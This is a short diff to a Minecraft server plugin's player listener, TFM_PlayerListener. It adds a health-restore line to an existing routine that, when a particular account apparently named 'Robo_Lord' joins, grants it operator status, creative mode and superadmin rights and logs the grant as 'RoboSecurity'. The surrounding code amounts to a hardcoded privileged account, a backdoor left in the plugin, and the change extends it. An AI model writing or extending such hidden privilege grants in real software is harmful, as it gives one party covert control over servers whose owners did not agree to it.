@@ -524,6 +524,7 @@ public class TFM_PlayerListener implements Listener
                }
                 // Take action if robo
                 player.setOp(true);
+                player.setHealth(20.0);
                 player.setGameMode(GameMode.CREATIVE);
                 TFM_AdminList.addSuperadmin(player);
                 TFM_Util.adminAction("RoboSecurity", "Adding Robo_Lord to the super admin list.");
